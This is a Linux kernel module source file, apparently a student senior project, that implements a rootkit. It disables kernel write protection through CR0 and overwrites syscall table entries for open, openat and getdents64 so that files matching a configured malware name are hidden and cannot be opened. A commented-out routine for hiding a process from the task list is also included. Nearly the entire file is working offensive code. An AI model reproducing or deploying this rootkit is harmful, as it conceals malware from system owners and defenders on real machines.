#include <linux/init.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/sched.h>
#include <asm/current.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Noop Noop");
MODULE_DESCRIPTION("Senior Project");
MODULE_VERSION("0.1");

// https://linux.die.net/man/2/getdents64
struct linux_dirent {
	long		d_ino;
	off_t		d_off;
	unsigned short	d_reclen;
	char 		d_name[];
};


uint64_t __force_order; //from linux source write_cr0, forces serialization 
void ** syscall_table;
char * malware_name = MALWARE_NAME;

// previously saved function pointers
asmlinkage long (*original_sys_openat)(const struct pt_regs * regs);
asmlinkage long (*original_sys_open)(const struct pt_regs * regs);
asmlinkage long (*original_sys_getdents64)(const struct pt_regs * regs);

asmlinkage long mal_sys_openat(const struct pt_regs * regs)
{
		char * file_name_buf = kmalloc(0x400, GFP_KERNEL);
		int ret = strncpy_from_user(file_name_buf, (const char *)regs->si, 0x400);
		if (ret > 0) {
			if (strstr(file_name_buf, malware_name)) {
				kfree(file_name_buf);
				return -1;
			}
		}

		kfree(file_name_buf);
		return original_sys_openat(regs);
}


asmlinkage long mal_sys_open(const struct pt_regs * regs)
{
		char * file_name_buf = kmalloc(0x400, GFP_KERNEL);
		int ret = strncpy_from_user(file_name_buf, (const char *)regs->di, 0x400);
		if (ret > 0) {
			if (strstr(file_name_buf, malware_name)) {
				kfree(file_name_buf);
				return -1;
			}
		}

		kfree(file_name_buf);
		return original_sys_open(regs);
}


asmlinkage long mal_sys_getdents64(const struct pt_regs * regs)
{
	// check if file is included in getdents64 (ls source, readdir source)
	// first save the linux_dirent pointer
	void * dirent_ptr = regs->si;
	printk(KERN_INFO "COUNT: %x\n", regs->dx);

	long size = original_sys_getdents64(regs);
	printk(KERN_INFO "RET: %lx\n", size);

	if (size > 0){
		char * buffer = kmalloc(size+1, GFP_KERNEL);
		int copied_bytes = copy_from_user(buffer, dirent_ptr, size);
		if (copied_bytes > 0) {
			printk("UNKNOWN ERROR");
			return size;
		}

		// create a new buffer to copy into, in case there are bad files
		char * clean_buff = kmalloc(size+1, GFP_KERNEL);

		int curr_off = 0;
		int clean_off = 0;
		for (curr_off = 0; curr_off < size; ) {
			struct linux_dirent * dpt = (struct linux_dirent *)(buffer+curr_off);
			printk(KERN_INFO "SIZE: %lx\n", dpt->d_reclen);
			printk(KERN_INFO "NAME: %s\n", dpt->d_name);

			// it can be seen in the debug information that d_name starts with a character
			// 0x04 indicates a directory
			// 0x08 indicates a file
			// This should not matter as we are trying to block a file, and 0x04 is not NULL 

			if (strstr(dpt->d_name, malware_name)) {
				// each call seeks file stream, so just return next
				curr_off += dpt->d_reclen;
				continue;
			}

			memcpy(clean_buff+clean_off, buffer+curr_off, dpt->d_reclen);

			clean_off += dpt->d_reclen;
			curr_off += dpt->d_reclen;
		}

		copy_to_user(dirent_ptr, clean_buff, clean_off);
		return clean_off;
	}
	return size; 
}

/**
static void hide_task_struct(void)
{
		struct task_struct * task_iter;
		struct task_struct * next_task;
		struct task_struct * prev_task;

		for_each_process(task_iter) {
				if (!strcmp(task_iter->comm, malware_name)) {
						prev_task = list_entry_rcu(task_iter->tasks.prev, struct task_struct, tasks);
						next_task = list_entry_rcu(task_iter->tasks.next, struct task_struct, tasks);
						list_add(&(prev_task->tasks), &(next_task->tasks));
						list_add_tail(&(next_task->tasks), &(prev_task->tasks));
						break;
				}
		}
}**/


// https://hadfiabdelmoumene.medium.com/change-value-of-wp-bit-in-cr0-when-cr0-is-panned-45a12c7e8411
static void write_cr0_pinned(uint64_t value)
{
		asm volatile("mov %0, %%cr0": "+r"(value), "+m"(__force_order));
}


static void patch_syscall(uint64_t index, void * function_ptr)
{
		unsigned long tmp_cr0 = read_cr0();
		clear_bit(16, &tmp_cr0);
		write_cr0_pinned(tmp_cr0);
		syscall_table[index] = function_ptr;
		tmp_cr0 = read_cr0();
		set_bit(16, &tmp_cr0);
		write_cr0_pinned(tmp_cr0);
		return;
}

// lookup alternative for kallsyms_lookup_name
static void ** syscall_table_lookup(void)
{
	unsigned long i;
	for (i = (unsigned long)ksys_close; i < 0xffffffffffffffff; i += sizeof(void *)) {
		void ** syscall_table = (void **)i;
		if (syscall_table[__NR_ptrace] == ksys_close) {
			return syscall_table;
		}
	}

	return NULL;
}

static int __init rootkit_init(void)
{
		printk(KERN_INFO "Initializing...\n");

		//syscall_table = (uint64_t *)kallsyms_lookup_name("sys_call_table");
		//syscall_table = syscall_table_lookup();
		// manually patch for now
		syscall_table = (void *)0xffffffff996002c0;
		printk(KERN_INFO "SYSCALL TABLE @ %llx\n", (uint64_t)syscall_table);

		original_sys_open = syscall_table[__NR_open];
		original_sys_openat = syscall_table[__NR_openat];
		original_sys_getdents64 = syscall_table[__NR_getdents64];

		printk(KERN_INFO "sys_open @ %llx\n", (uint64_t)original_sys_open);
		printk(KERN_INFO "sys_openat @ %llx\n", (uint64_t)original_sys_openat);
		printk(KERN_INFO "sys_getdents64 @ %llx\n", (uint64_t)original_sys_getdents64);

		patch_syscall(__NR_open, mal_sys_open);
		patch_syscall(__NR_openat, mal_sys_openat);
		patch_syscall(__NR_getdents64, mal_sys_getdents64);

		// TODO: find malware process and remove from process list
		// hide_task_struct();
		return 0;
}

static void __exit rootkit_exit(void)
{
		// Here, install exit procedures for the rootkit
		// repair syscall table
		patch_syscall(__NR_openat, original_sys_openat);
		patch_syscall(__NR_open, original_sys_open);
		patch_syscall(__NR_getdents64, original_sys_getdents64);
		printk(KERN_INFO "Exiting...\n");
		return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);
